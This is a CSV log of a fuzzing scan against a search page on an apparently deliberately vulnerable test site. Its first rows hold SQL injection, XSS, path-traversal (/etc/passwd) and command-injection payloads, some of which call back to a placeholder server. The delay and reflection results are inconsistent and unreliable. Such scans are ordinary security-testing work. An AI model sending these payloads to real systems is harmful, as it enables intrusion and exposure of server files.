id_fuzz,#,URL,Method,StatusCode,SearchKeyword,TimeDelay
id_fuzz_1,1,http://testphp.vulnweb.com/search.php?test=x'||pg_sleep(10)--,POST,200 is present ,test is reflected ,is not delayed
id_fuzz_1,2,http://testphp.vulnweb.com/search.php?test=',POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,3,http://testphp.vulnweb.com/search.php?test='--,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,4,http://testphp.vulnweb.com/search.php?test=' or 1=1--,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,5,http://testphp.vulnweb.com/search.php?test=' or 1 in (@@version)--,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,6,http://testphp.vulnweb.com/search.php?test='; waitfor delay '0:30:0'--,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,7,http://testphp.vulnweb.com/search.php?test='||Utl_Http.request('http://<yourservername>') from dual--,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,8,http://testphp.vulnweb.com/search.php?test=xsstest,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,9,"http://testphp.vulnweb.com/search.php?test=xsstest%00""<>'",POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,10,http://testphp.vulnweb.com/search.php?test=</foo>,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,11,http://testphp.vulnweb.com/search.php?test=../../../../../../../../../../etc/passwd,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,12,http://testphp.vulnweb.com/search.php?test=../../../../../../../../../../boot.ini,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,13,http://testphp.vulnweb.com/search.php?test=..\..\..\..\..\..\..\..\..\..\etc\passwd,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,14,http://testphp.vulnweb.com/search.php?test=..\..\..\..\..\..\..\..\..\..oot.ini,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,15,http://testphp.vulnweb.com/search.php?test=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,16,http://testphp.vulnweb.com/search.php?test=| ping -i 30 127.0.0.1 |,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,17,http://testphp.vulnweb.com/search.php?test=| ping -n 30 127.0.0.1 |,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,18,http://testphp.vulnweb.com/search.php?test=& ping -i 30 127.0.0.1 &,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,19,http://testphp.vulnweb.com/search.php?test=& ping -n 30 127.0.0.1 &,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,20,http://testphp.vulnweb.com/search.php?test=; ping 127.0.0.1 ;,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,21,http://testphp.vulnweb.com/search.php?test=%0a ping -i 30 127.0.0.1 %0a,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,22,http://testphp.vulnweb.com/search.php?test=`ping 127.0.0.1`,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,23,http://testphp.vulnweb.com/search.php?test=| id,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,24,http://testphp.vulnweb.com/search.php?test=& id,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,25,http://testphp.vulnweb.com/search.php?test=; id,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,26,http://testphp.vulnweb.com/search.php?test=%0a id %0a,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,27,http://testphp.vulnweb.com/search.php?test=`id`,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,28,http://testphp.vulnweb.com/search.php?test=;echo 111111,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,29,http://testphp.vulnweb.com/search.php?test=echo 111111,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,30,http://testphp.vulnweb.com/search.php?test=response.write 111111,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,31,http://testphp.vulnweb.com/search.php?test=:response.write 111111,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,32,http://testphp.vulnweb.com/search.php?test=http://<yourservername>/,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,33,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected x'||pg_sleep(10)-- is reflected ,is delayed
id_fuzz_1,34,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,35,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,36,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,37,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,38,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,39,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,40,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,41,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,42,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,43,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,44,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,45,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,46,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,47,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,48,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,49,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,50,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,51,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,52,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,53,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,54,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,55,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,56,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,57,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,58,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,59,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,60,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,61,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,62,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,63,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,64,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,65,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,66,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,67,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,68,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,69,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,70,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,71,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,72,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,73,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,74,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,75,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,76,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,77,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,78,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,79,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,80,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,81,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,82,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,83,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,84,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,85,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,86,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,87,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,88,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,89,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,90,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,91,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,92,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,93,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,94,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,95,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,96,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
